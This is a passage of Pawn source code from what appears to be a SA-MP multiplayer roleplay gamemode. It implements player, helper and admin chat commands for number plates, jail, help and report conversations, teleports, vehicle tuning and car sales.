                SetVehicleZAngle(GetPlayerVehicleID(playerid),ang);
                strmid(PlayerInfo[MashinOwner[idcar]][cPlate], tmp, 0, strlen(tmp), 255);
                SaveKonStr(MashinOwner[idcar], "cPlate", PINFO[MashinOwner[idcar]][cPlate]);
                GivePlayerPool(playerid, -100);
                GameTextForPlayer(playerid, "~w~Number plate has placed~n~~r~-$100", 4000, 3);
                //SaveAccount(playerid);
            }
            else
            {
                SCM(playerid, COLOR_RED, "Shoma Pool Kafi Nadarid.");
                PlayerPlaySound(playerid, 1055, 0.0, 0.0, 10.0)
                return 1;
            }
        }
        else if(GetPlayerVehicleID(playerid) == PINFO[playerid][pCar_2])
        {
            if(GetPlayerPool(playerid) >= 100)
            {
                new Float:x,Float:y,Float:z,Float:ang;
                SetVehicleNumberPlate(GetPlayerVehicleID(playerid), tmp);
                GetVehiclePos(GetPlayerVehicleID(playerid),x,y,z);
                GetVehicleZAngle(GetPlayerVehicleID(playerid),ang);
                PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                SetVehiclePos(GetPlayerVehicleID(playerid),x,y,z);
                SetVehicleZAngle(GetPlayerVehicleID(playerid),ang);
                strmid(PlayerInfo[MashinOwner_2[idcar]][cPlate_2], tmp, 0, strlen(tmp), 255);
                SaveKonStr(MashinOwner_2[idcar], "cPlate_2", tmp);
                GivePlayerPool(playerid, -100);
                GameTextForPlayer(playerid, "~w~Number plate has placed~n~~r~-$100", 4000, 3);
                //SaveAccount(playerid);
            }
            else
            {
                SCM(playerid, COLOR_RED, "Shoma Pool Kafi Nadarid.");
                PlayerPlaySound(playerid, 1055, 0.0, 0.0, 10.0)
                return 1;
            }
        }
        else return SCM(playerid,COLOR_ALI,"You need to sit on your vehicle first.");
        return 1;
    }





    if(!strcmp(cmd, "/specoff", true))
    {
        if(PlayerInfo[playerid][pAdmin] >= 1){
        if(Specing[playerid] >= 1)
        {
            StopSpec(playerid);
	    PhoneOnline[playerid] = 1;
	    pNoFind[playerid] = 0;
        new string[256];
        format(string,256,"{FFFFFF}Admin %s has stopped specing.",PINFO[playerid][pName]);
        AdminWarn(string);
            return 1;
        }
        else
        {
        SCM(playerid,COL_SYN,"You are not on specing.");
        return 1;
        }
        }
        else
        {
        SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
        return 1;
        }
    }
    if(!strcmp(cmd, "/unjail", true))
    {
        if(PlayerInfo[playerid][pAdmin] >= 8)
        {
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SendClientMessage(playerid, COL_SYN, "Syntax: /unjail <PlayerID/PartOfName>");
            new player1, string[128];
            player1 = ReturnUser(tmp);
            if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID)
            {
                if(PlayerInfo[player1][pJailTime] >= 1)
                {
                    format(string,sizeof(string),"Admin %s has unjailed you.",PINFO[playerid][pName]);
                    SCM(player1,COLOR_GG,string);
                    format(string,sizeof(string),"You have unjailed %s",PINFO[player1][pName]);
                    SCM(playerid,COLOR_GG,string);
                    format(string,sizeof string,"%s has been unjailed by admin %s",PINFO[player1][pName],PINFO[playerid][pName]);
                    AdminWarn(string);
                    PlayerInfo[player1][pJailTime] = 1;//Nemikhad save she
                    Mahal[player1] = 9999;
                    TooHouse[player1] = 9999;
                    TooBiz[player1] = 9999;
                } else return SendClientMessage(playerid, COL_SYN, "Player is not in jail.");
            } else return PlayerNotConnected(playerid);
        } else return ErrorMessage1(playerid);
        return 1;
    }
    if(!strcmp(cmd, "/cc", true))
    {
        if(PlayerInfo[playerid][pAdmin] >= 1)
        {
            GameTextForAll("", 1000,1);
            for(new i = 0; i < 100; i++) { SendClientMessageToAll(COLOR_CRS3," "); }
            new stri[256];
            format(stri,256,"Chat cleared by admin %s.",PINFO[playerid][pName]);
            AdminWarn(stri);
            return 1;
        }
        else return ErrorMessage1(playerid);
    }
    if(!strcmp(cmd,"/helpme",true))
    {
        if(PINFO[playerid][pHelper] > 0) return SCM(playerid,COLOR_ALI,"Helpers cannot request a helpme conversation.");
        if(Helpme[playerid] != INVALID_PLAYER_ID) return SCM(playerid,COLOR_GG,"Wait for the last help conversation to be solved.");
        tmp = strtokEx(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /helpme <Text>");
        Helpme[playerid] = INVALID_PLAYER_ID-1;
        format(HelpmeText[playerid],100,tmp);
        new string[100];
        format(string, 100, "[HELPME]: %s(%i): %s",PINFO[playerid][pName],playerid,tmp);
        for(new i;i<LastPID;i++)
        {
            if(PINFO[i][pHelper] >= 1)
            {
                SCM(i, COLOR_GG, string);
            }
        }
        return SCM(playerid,COLOR_GG,"Darkhast Shoma Be Helperhaie Online Ferestade Shod.");
    }
    if(!strcmp(cmd,"/ahelpme",true))
    {
        if(PINFO[playerid][pHelper] < 1) return SCM(playerid,COLOR_YELLOW2,"Error: You are not a helper.");
        for(new i;i<LastPID;i++)
        {
            if(Helpme[i] == playerid && IsPlayerConnected(i) && i != playerid)
            {
                return SCM(playerid,COLOR_GG,"You already have a openen help conversation.");
            }
        }
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN, "Syntax: /ahelpme <PlayerID/PartOfName>");
        new user = ReturnUser(tmp);
        if(!IsPlayerConnected(user)) return SCM(playerid,COLOR_YELLOW2,"Error: That player isn't connected.");
        if(PINFO[user][pHelper] > 0) return SCM(playerid,COLOR_GG,"Error: That player is a Helper.");
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i))
            {
                if(Helpme[user] == i)
                {
                    new lolstr[256];
                    format(lolstr, 256, "This player already is on helping with %s(%i).", PINFO[i][pName], i);
                    return SCM(playerid, COLOR_GG, lolstr);
                }
            }
        }
        Helpme[user] = playerid;
        new string[100];
        format(string, 100, "Helper %s opens your help conversation.",PINFO[playerid][pName]);
        SCM(user,COLOR_YELLOW,string);
        SCM(user,COLOR_YELLOW,"{57e547}Use {00FF00}/hc {57e547}to chat with him/her.");
        format(string, 100, "Helper %s(%i) opens %s(%i) help conversation.",PINFO[playerid][pName],playerid,PINFO[user][pName],user);
        for(new i;i<LastPID;i++)
        {
            if(PINFO[i][pHelper] >= 1)
            {
                SCM(i, COLOR_GG, string);
            }
        }
        return SCM(playerid,COLOR_GG,"{57e547}Use {00FF00}/hc {57e547}to speak with him.");
        return 1;
    }
    
    if(!strcmp(cmd, "/oldcar", true))
    {
        if(OldCar[playerid] == INVALID_VEHICLE_ID) return SCM(playerid, COLOR_ALI, "You never entered a vehicle.");
        new lolhash[256];
        format(lolhash, 256, "Oldcar ID: %i", OldCar[playerid]);
        return SCM(playerid, COLOR_LIGHTRED, lolhash);
    }
    if(!strcmp(cmd,"/chelpme",true))
    {
        if(PINFO[playerid][pHelper] < 1) return SCM(playerid,COLOR_YELLOW2,"Error: You are not a helper.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN, "Syntax: /chelpme <PlayerID/PartOfName>");
        new user = ReturnUser(tmp);
        if(!IsPlayerConnected(user)) return SCM(playerid,COLOR_YELLOW2,"Error: That player isn't connected.");
        if(Helpme[user] == INVALID_PLAYER_ID) return SCM(playerid,COLOR_YELLOW2,"Error: That player won't help.");
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i) && i != playerid)
            {
                if(Helpme[user] == i)
                {
                    new lolstr[256];
                    format(lolstr, 256, "This player already is on helping with %s(%i).", PINFO[i][pName], i);
                    return SCM(playerid, COLOR_GG, lolstr);
                }
            }
        }
        Helpme[user] = INVALID_PLAYER_ID;
        new string[100];
        format(string, 100, "Helper %s closed your help conversation.",PINFO[playerid][pName]);
        SCM(user,COLOR_YELLOW,string);
        format(string, 100, "Helper %s(%i) closed %s(%i) help conversation.",PINFO[playerid][pName],playerid,PINFO[user][pName],user);
        for(new i;i<LastPID;i++)
        {
            if(PINFO[i][pHelper] >= 1)
            {
                SCM(i, COLOR_GG, string);
            }
        }
        return 1;
    }
    	if(!strcmp(cmd,"/ar",true))
	{
	    if(PINFO[playerid][pAdmin] < 1) return SCM(playerid,COLOR_YELLOW2,"Error: You are not a Admin.");
		for(new i;i<LastPID;i++)
		{
		    if(Reported[i] == playerid && i != playerid && IsPlayerConnected(i))
		    {
		        new lolhash[256];
		        format(lolhash, 256, "You already have a opened conversation with %s(%i).",PINFO[i][pName], i);
		        return SCM(playerid,COLOR_GG,lolhash);
		    }
		}
	    tmp = strtok(cmdtext,idx);
		if(!strlen(tmp)) return SCM(playerid,COL_SYN, "Syntax: /areport <PlayerID/PartOfName>");
		new user = ReturnUser(tmp);
		if(!IsPlayerConnected(user)) return SCM(playerid,COLOR_YELLOW2,"Error: That player isn't connected.");
		if(PINFO[user][pAdmin] > 0) return SCM(playerid,COLOR_GG,"Error: That player is an Admin.");
		for(new i;i<LastPID;i++)
		{
		    if(IsPlayerConnected(i))
		    {
			    if(Reported[user] == i)
			    {
					new lolstr[256];
					format(lolstr, 256, "This player already is on reporting with %s(%i).", PINFO[i][pName], i);
					return SCM(playerid, COLOR_GG, lolstr);
				}
			}
		}
		Reported[user] = playerid;
		new string[100];
		format(string, 100, "Admin %s opens your report conversation.",PINFO[playerid][pName]);
		SCM(user,COLOR_YELLOW,string);
		SCM(user,COLOR_YELLOW,"Use /al to chat with him/her.");
		format(string, 100, "Admin %s(%i) opens %s(%i) report conversation.",PINFO[playerid][pName],playerid,PINFO[user][pName],user);
		for(new i;i<LastPID;i++)
		{
		    if(PINFO[i][pAdmin] >= 1)
		    {
				SCM(i, COLOR_GG, string);
			}
		}
		return SCM(playerid,COLOR_GG,"Use /al to speak with him");
	}
    if(!strcmp(cmd,"/helpmes",true))
    {
        if(PINFO[playerid][pHelper] < 1) return SCM(playerid,COLOR_YELLOW2,"Error: You are not a helper.");
        new strlol[2000],strlol2[60],b;
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i) && Helpme[i] == INVALID_PLAYER_ID-1)
            {
                format(strlol2, 256,"%s(%i) - %s",PINFO[i][pName],i,HelpmeText[i]);
                strcat(strlol, strlol2, 2000);
                HelpmeDLG[playerid][b] = i;
                b ++;
            }
        }
        ShowPlayerDialog(playerid, 7815, DIALOG_STYLE_LIST, "[HELPMES]", strlol, "Select", "Close");
        return 1;
    }
    if(!strcmp(cmd,"/hc",true))
    {
        if(PINFO[playerid][pHelper] >= 1)
        {
            for(new i;i<LastPID;i++)
            {
                if(Helpme[i] == playerid)
                {
                    tmp = strtokEx(cmdtext,idx);
                    if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /hc <Chat>");
                    new strlol[256];
                    format(strlol, 256, "Helper %s: %s",PINFO[playerid][pName],tmp);
                    SCM(i, COLOR_YELLOW, strlol);
                    SCM(playerid, COLOR_YELLOW, strlol);
                    return 1;
                }
            }
        }
        if(PINFO[playerid][pHelper] >= 1) return SCM(playerid,COLOR_ALI,"You haven't a opened helpme convetion.");
        if(Helpme[playerid] >= INVALID_PLAYER_ID-2) return SCM(playerid,COLOR_ALI,"You haven't a opened help conversation.");
        tmp = strtokEx(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN, "Syntax: /hc <Chat>");
        new strlol[256];
        format(strlol, 256, "Player %s(%d): %s",PINFO[playerid][pName],playerid,tmp);
        SCM(Helpme[playerid],COLOR_YELLOW,strlol);
        SCM(playerid, COLOR_YELLOW, strlol);
        return 1;
    }






		if(!strcmp(cmd,"/cr",true))
		{
			if(PINFO[playerid][pAdmin] < 1) return SCM(playerid,COLOR_YELLOW2,"Error: You are not a Admin.");
			tmp = strtok(cmdtext,idx);
			if(!strlen(tmp)) return SCM(playerid,COL_SYN, "Syntax: /cr <PlayerID/PartOfName> <Reason>");
			new user = ReturnUser(tmp);
			if(!IsPlayerConnected(user)) return SCM(playerid,COLOR_YELLOW2,"Error: That player isn't connected.");
			if(Reported[user] == INVALID_PLAYER_ID) return SCM(playerid,COLOR_YELLOW2,"Error: That player won't report.");

			new reason[512];
			reason = strtokEx(cmdtext,idx);
			if(strlen(reason)) {
			for(new i = 0;i<LastPID;i++)
			{
				if(IsPlayerConnected(i) && i != playerid)
				{
					if(Reported[user] == i)
					{
						new lolstr[256];
						format(lolstr, 256, "This player already is on reporting with %s(%i).", PINFO[i][pName], i);
						return SCM(playerid, COLOR_GG, lolstr);
					}
				}
			}
			Reported[user] = INVALID_PLAYER_ID;
			new string[512];
			format(string, 512, "Admin %s closed your report conversation. {57e547}(reason: {FFFFFF}%s.{57e547})",PINFO[playerid][pName], reason);
			SCM(user,COLOR_AdminWarn,string);
			format(string, 512, "Admin %s(%i) closed %s(%i) report conversation. {57e547}(reason: {FFFFFF}%s.{57e547})",PINFO[playerid][pName],playerid,PINFO[user][pName],user, reason);
			for(new i = 0;i<LastPID;i++)
			{
				if(PINFO[i][pAdmin] >= 1)
				{
					SCM(i, COLOR_AdminWarn, string);
				}
			}
			return 1;
			}

			for(new i = 0;i<LastPID;i++)
			{
				if(IsPlayerConnected(i) && i != playerid)
				{
					if(Reported[user] == i)
					{
						new lolstr[256];
						format(lolstr, 256, "This player already is on reporting with %s(%i).", PINFO[i][pName], i);
						return SCM(playerid, COLOR_GG, lolstr);
					}
				}
			}
			Reported[user] = INVALID_PLAYER_ID;
			new string[100];
			format(string, 100, "Admin %s closed your report conversation.",PINFO[playerid][pName]);
			SCM(user,COLOR_AdminWarn,string);
			format(string, 100, "Admin %s(%i) closed %s(%i) report conversation.",PINFO[playerid][pName],playerid,PINFO[user][pName],user);
			for(new i = 0;i<LastPID;i++)
			{
				if(PINFO[i][pAdmin] >= 1)
				{
					SCM(i, COLOR_AdminWarn, string);
				}
			}
			return 1;
		}
    if(!strcmp(cmd, "/myreferral", true))
    {
        new googooli[100];
        format(googooli, 100, "Your referral id is: %i", PINFO[playerid][pID]);
        return SCM(playerid, COLOR_Good, googooli);
    }
    if(!strcmp(cmd, "/refs", true))
    {
        if(PINFO[playerid][pAdmin] < 5) return SCM(playerid,COLOR_YELLOW2,"Error: You are not a Admin.");
        new googooli[100];
        format(googooli, 100, "His refferals is: %i", PINFO[playerid][pReferral]);
        return SCM(playerid, COLOR_Good, googooli);
    }
    if(!strcmp(cmd,"/reports",true))
    {
        if(PINFO[playerid][pAdmin] < 1) return SCM(playerid,COLOR_YELLOW2,"Error: You are not a Admin.");
        new strlol[2000],strlol2[60],b;
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i) && Reported[i] == INVALID_PLAYER_ID-1)
            {
                format(strlol2, 256,"%s(%i) - reports something",PINFO[i][pName],i,ReportText[i]);
                strcat(strlol, strlol2, 2000);
                ReportDLG[playerid][b] = i;
                b ++;
            }
        }
        ShowPlayerDialog(playerid, 7820, DIALOG_STYLE_LIST, "[REPORT]", strlol, "Select", "Close");
        return	1;
    }
    if(strcmp(cmd, "/wanted", true) == 0)
    {

        if(!IsACop(playerid)) return SCM(playerid,COLOR_PD,"Error: You are not a cop.");
            if(OnDuty[playerid] != 1)
            {
                SendClientMessage(playerid, COLOR_BLUE, "You are not on-duty.");
                return 1;
            }
        new strlol[2000],strlol2[60],w;
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i) && GetPlayerWantedLevel(i) >= 1)
            {
		new Float:x, Float:y, Float:z;
		GetPlayerPos(i, x, y, z);
		new Float: pDistance = GetPlayerDistanceFromPoint(playerid, x, y, z);
		floatround(pDistance, floatround_round);
		new zonename[30];
                GetPlayerZoneName(i, zonename, 30)
                format(strlol2, 256,"%s(%i) W(%d) L(%s) D(%f) \t\n",PINFO[i][pName],i,GetPlayerWantedLevel(i),zonename,pDistance);
                strcat(strlol, strlol2, 2000);
                WDLG[playerid][w] = i;
                w ++;
            }
        }
        ShowPlayerDialog(playerid, 78200, DIALOG_STYLE_LIST, "[Wanteds]", strlol, "Select", "Close");
        return	1;
	}
    if(!strcmp(cmd,"/al",true))
    {
        if(PINFO[playerid][pAdmin] >= 1)
        {
            for(new i;i<LastPID;i++)
            {
                if(Reported[i] == playerid && IsPlayerConnected(i))
                {
                    tmp = strtokEx(cmdtext,idx);
                    if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /al <Chat>");
                    new strlol[256];
                    format(strlol, 256, "Admin %s: %s",PINFO[playerid][pName],tmp);
                    SCM(i, COLOR_YELLOW, strlol);
                    SCM(playerid, COLOR_YELLOW, strlol);
                    return 1;
                }
            }
        }
        if(PINFO[playerid][pAdmin] >= 1) return SCM(playerid,COLOR_ALI,"You haven't a opened report convetion.");
        if(Reported[playerid] >= INVALID_PLAYER_ID-2) return SCM(playerid,COLOR_ALI,"You haven't a opened help conversation.");
        tmp = strtokEx(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN, "Syntax: /al <Chat>");
        new strlol[256];
        format(strlol, 256, "Player %s(%d): %s",PINFO[playerid][pName],playerid,tmp);
        SCM(Reported[playerid],COLOR_YELLOW,strlol);
        SCM(playerid,COLOR_YELLOW,strlol);
        return 1;
    }




    if(strcmp(cmd,"/viphelp",true)==0) {
        if(IsPlayerConnected(playerid)) {
                new x_nr[256];
                x_nr = strtok(cmdtext, idx);
                if(!strlen(x_nr)) {
                    SCM(playerid, COLOR_WHITE, "USAGE: /viphelp [VipLevel (1-2)]");
                    return 1; }
                if(strcmp(x_nr,"1",true) == 0) {
        SCM(playerid,COLOR_GREEN,"|_________________Vip Level 1_________________|");
        SCM(playerid,COLOR_WHITE,"| /Vfix , /Vveh , /Vdv, /Vnitro");
        SCM(playerid,COLOR_WHITE,"| /Vflip , /Vgotols");}
                else if(strcmp(x_nr,"2",true) == 0) {
        SCM(playerid,COLOR_GREEN,"|_________________Vip Level 2_________________|");
        SCM(playerid,COLOR_WHITE,"| /Vfill /Vgoto");}
                else
                SCM(playerid, COLOR_CRS3, "** Invalid number.");
                return 1; }
        return 1; }



    if(!strcmp(cmd,"/hh",true))
    {
        if(PINFO[playerid][pHelper] <= 0) return SCM(playerid,COLOR_GREEN,"Error: Your helper level isn't high enough to use this command.");
        SCM(playerid,COLOR_GREEN,"|_________________Helper Commands (Level)_________________|");
        SCM(playerid,COLOR_WHITE,"| /bala (4), /paien (4), /hh, /hc, /ahelpme, /helperchat(/hcc),");
        SCM(playerid,COLOR_WHITE,"| /chelpme, /helpmes, /goto (2), /pm, /goback (3)");
        return 1;
    }
    if(!strcmp(cmd,"/findrentveh",true))
    {
        if(RentedVehicle[playerid] == INVALID_VEHICLE_ID) return SCM(playerid,COLOR_ALI,"You don't rent a vehicle.");
        if(!IsVehicleConnected(RentedVehicle[playerid])) return 1;
        if(OnCheckpoint[playerid] != 0) return SCM(playerid,COL_SYN,"You already have a enable checkpoint.");
        new Float:ui[3];
        GetVehiclePos(RentedVehicle[playerid], ui[0], ui[1], ui[2]);
        SetPlayerCheckpoint(playerid, ui[0],ui[1],ui[2],5);
        OnCheckpoint[playerid] = 1;
        CP[playerid] = 1187;
        return SCM(playerid,COL_SYN,"Server placed a checkpoint at your rented vehicle.");
    }
    if(!strcmp(cmd,"/say",true))
    {
        if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,COLOR_ALI,"You cannot speak when you are muted.");
        tmp = strtokEx(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /say <Text>");
        new strchat[180];
        format(strchat, sizeof(strchat), "%s Goft: %s", PINFO[playerid][pName], tmp);
        ProxDetector(20.0, playerid, strchat,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
        return 1;
    }
    if(!strcmp(cmd,"/amodveh",true))
    {
        if(PINFO[playerid][pAdmin] <= 3) return SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
        if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_GG,"Error: You are not in any vehicle.");
        new RAType[256];
        RAType = strtok(cmdtext,idx);
        if(!strlen(RAType)) return SCM(playerid, COL_SYN, "Syntax: /amodveh <Remove/Add> <ComponetID(1000-1193 see sa-mp wiki)>");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /amodveh <Remove/Add> <ComponetID(1000-1193 see sa-mp wiki)>");
        new comp = strval(tmp);
        if(comp < 1000 || comp > 1193) return SCM(playerid,COLOR_ALI,"Invalid componetid.");
        new string[30];
        new slotid = GetVehicleComponentType(comp);
        switch(slotid)
        {
            case 0:{strmid(string, "spoiler", 0, strlen("spoiler"), 30);}
            case 1:{strmid(string, "hood", 0,strlen("hood"), 30);}
            case 2:{strmid(string, "roof", 0,strlen("roof"), 30);}
            case 3:{strmid(string, "side skirt", 0,strlen("side skirt"), 30);}
            case 4:{strmid(string, "lamp", 0,strlen("lamp"), 30);}
            case 5:{strmid(string, "nitro", 0,strlen("nitro"), 30);}
            case 6:{strmid(string, "exhaust", 0,strlen("exhaust"), 30);}
            case 7:{strmid(string, "wheel", 0,strlen("wheel"), 30);}
            case 8:{strmid(string, "streo system", 0,strlen("streo system"), 30);}
            case 9:{strmid(string, "hydraulics", 0,strlen("hydraulics"), 30);}
            case 10:{strmid(string, "front bumper", 0,strlen("front bumper"), 30);}
            case 11:{strmid(string, "rear bumper", 0,strlen("rear bumper"), 30);}
            case 12:{strmid(string, "right vent", 0,strlen("right vent"), 30);}
            case 13:{strmid(string, "left vent", strlen("left vent"), 30);}
        }
        new strali[256];
        if(!strcmp(RAType, "Add", true))
        {
            AddVehicleComponent(GetPlayerVehicleID(playerid), comp);
            format(strali, 256, "You attached a(n) %s to your vehicle.",string);
        }
        else if(!strcmp(RAType, "Remove", true))
        {
            RemoveVehicleComponent(GetPlayerVehicleID(playerid), comp);
            format(strali, 256, "You deattached a(n) %s from your vehicle.",string);
        }
        return SCM(playerid,COLOR_GG,strali);
    }
    if(!strcmp(cmd,"/vehcolor",true))
    {
        if(PINFO[playerid][pAdmin] <= 3) return SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
        if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_GG,"Error: You are not in any vehicle.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /vehcolor <ColorID1> <ColorID2>");
        new col1 = strval(tmp);
        if(col1 < 0 || col1 > 255) return SCM(playerid,COLOR_ALI,"ColorIDs must be between 0 and 255");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /vehcolor <ColorID1> <ColorID2>");
        new col2 = strval(tmp);
        if(col2 < 0 || col2 > 255) return SCM(playerid,COLOR_ALI,"ColorIDs must be between 0 and 255");
        ChangeVehicleColor(GetPlayerVehicleID(playerid), col1, col2);
        return SCM(playerid,COLOR_ALI,"The color of the vehicle has been changed.");
    }
    if(!strcmp(cmd,"/gotopveh555",true))
    {
        if(PINFO[playerid][pAdmin] <= 3) return SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /GotoPVeh <PlayerID/PartOfName>");
        new taraf = ReturnUser(tmp);
        if(!IsPlayerConnected(taraf)) return SCM(playerid,COLOR_YELLOW2,"Error: Player is not connected.");
        if(!IsPlayerInAnyVehicle(taraf)) return SCM(playerid,COLOR_ALI,"Error: Player is not in any vehicle.");
        new veh = GetPlayerVehicleID(taraf),Passengers;
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i))
            {
                if(IsPlayerInVehicle(i, veh))
                {
                    if(GetPlayerState(i) == PLAYER_STATE_PASSENGER)
                    {
                        Passengers ++;
                    }
                }
            }
        }
        if(Passengers >= VehiclePassengerSlots[GetVehicleModel(veh)-400])
        {
            new Float:lp[3],Float:Ang,virtualw,inter;
            GetVehiclePos(veh, lp[0], lp[1], lp[2]);
            GetVehicleZAngle(veh, Ang);
            virtualw = GetVehicleVirtualWorld(veh);
            inter = GetPlayerInterior(taraf);
            SetPlayerPosEx(playerid, lp[0], lp[1], lp[2]+0.4);
            SetPlayerFacingAngle(playerid, Ang);
            SetPlayerVirtualWorld(playerid,virtualw);
            SetPlayerInterior(playerid, inter);
            Mahal[playerid] = Mahal[taraf];
            TooBiz[playerid] = TooBiz[taraf];
            TooHouse[playerid] = TooHouse[taraf];
            return SCM(playerid,COLOR_ALI,"That player's vehicle is full vehicle passenger seats.");
        }
        new PassengerPut;
        for(new i = 1;i<VehiclePassengerSlots[GetVehicleModel(veh)-400]+1;i++)
        {
            for(new b;b<LastPID;i++)
            {
                if(IsPlayerConnected(b))
                {
                    if(GetPlayerVehicleID(b) == veh && GetPlayerState(b) == PLAYER_STATE_PASSENGER && GetPlayerVehicleSeat(b) == i) continue;
                    PassengerPut = i;
                }
            }
        }
        new virtualw,inter;
        virtualw = GetVehicleVirtualWorld(veh);
        inter = GetPlayerInterior(taraf);
        SetPlayerVirtualWorld(playerid,virtualw);
        SetPlayerInterior(playerid, inter);
        Mahal[playerid] = Mahal[taraf];
        TooBiz[playerid] = TooBiz[taraf];
        TooHouse[playerid] = TooHouse[taraf];
        PutPlayerInVehicle(playerid, veh, PassengerPut);
        return SCM(playerid,COLOR_GG,"You have been teleported.");
    }
    if(!strcmp(cmd,"/bala",true))
    {
        if(PINFO[playerid][pAdmin] <= 0 && PINFO[playerid][pHelper] <= 3) return SCM(playerid,COLOR_YELLOW2,"You are not a admin or helper.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /bala <Amount(FLOAT)>");
        new Float:alii = floatstr(tmp);
        SCM(playerid,COLOR_GG,"You have been teleported.");
        if(IsPlayerInAnyVehicle(playerid))
        {
            new Float:ppv[3];
            GetVehiclePos(GetPlayerVehicleID(playerid),ppv[0],ppv[1],ppv[2]);
            SetVehiclePos(GetPlayerVehicleID(playerid),ppv[0],ppv[1],ppv[2]+alii);
            return 1;
        }
        new Float:ppp[3];
        GetPlayerPos(playerid,ppp[0],ppp[1],ppp[2]);
        SetPlayerPosEx(playerid,ppp[0],ppp[1],ppp[2]+alii);
        return 1;
    }
    if(!strcmp(cmd,"/paien",true))
    {
        if(PINFO[playerid][pAdmin] <= 0 && PINFO[playerid][pHelper] <= 3) return SCM(playerid,COLOR_YELLOW2,"You are not a admin or helper.");
        SCM(playerid,COLOR_GG,"You have been teleported.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /paien <Amount(FLOAT)>");
        new Float:alii = floatstr(tmp);
        if(IsPlayerInAnyVehicle(playerid))
        {
            new Float:ppv[3];
            GetVehiclePos(GetPlayerVehicleID(playerid),ppv[0],ppv[1],ppv[2]);
            SetVehiclePos(GetPlayerVehicleID(playerid),ppv[0],ppv[1],ppv[2]-alii);
            return 1;
        }
        new Float:ppp[3];
        GetPlayerPos(playerid,ppp[0],ppp[1],ppp[2]);
        SetPlayerPosEx(playerid,ppp[0],ppp[1],ppp[2]-alii);
        return 1;
    }
    if(!strcmp(cmd,"/sellcar",true))
    {
        if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0) return SCM(playerid,COL_SYN,"You haven't a personal car.");
	if(PINFO[playerid][pLevel] < 5) return SCM(playerid,COL_SYN,"You should have level 5 or higher");
        if(GetPlayerVehicleID(playerid) == PINFO[playerid][pCar])
        {
            if(!IsPlayerInRangeOfPoint(playerid,8.0,329.8260,-1516.1796,35.8671)) return SCM(playerid,COLOR_ALI,"You are not on dealer ship.");
            new price = (PINFO[playerid][cPrice])*(40)/(100);
            new string[256];
            format(string,256,"Do you accept to sell your car with $%s price?\n\nIf you accept it select Accept If not, select Decline",FormatNumber(price));
            ShowPlayerDialog(playerid,8347,DIALOG_STYLE_MSGBOX,"Sell your car in DealerShip:",string,"Accept","Decline");
            return 1;
        }
        else if(GetPlayerVehicleID(playerid) == PINFO[playerid][pCar_2])
        {
            if(!IsPlayerInRangeOfPoint(playerid,8.0,329.8260,-1516.1796,35.8671)) return SCM(playerid,COLOR_ALI,"You are not on dealer ship.");
            new price = (PINFO[playerid][cPrice_2])*(40)/(100);
            new string[256];
            format(string,256,"Do you accept to sell your car with $%s price?\n\nIf you accept it select Accept If not, select Decline",FormatNumber(price));
            ShowPlayerDialog(playerid,8348,DIALOG_STYLE_MSGBOX,"Sell your car in DealerShip:",string,"Accept","Decline");
            return 1;
        }
        else return SCM(playerid,COLOR_ALI,"You need to sit on your vehicle.");
    }
    if(!strcmp(cmd,"/removetuning",true))
    {
        if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0) return SCM(playerid,COL_SYN,"You haven't a personal car.");
        if(GetPlayerVehicleID(playerid) == PINFO[playerid][pCar])
        {
            new veh = PINFO[playerid][pCar];
            if(GetPlayerVehicleID(playerid) != veh) return SCM(playerid,COLOR_ALI,"You must be in your personal car to remove tuning.");
            if(PINFO[playerid][cMod1] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod1]);
            if(PINFO[playerid][cMod3] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod3]);
            if(PINFO[playerid][cMod4] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod4]);
            if(PINFO[playerid][cMod5] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod5]);
            if(PINFO[playerid][cMod6] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod6]);
            if(PINFO[playerid][cMod7] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod7]);
            if(PINFO[playerid][cMod8] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod8]);
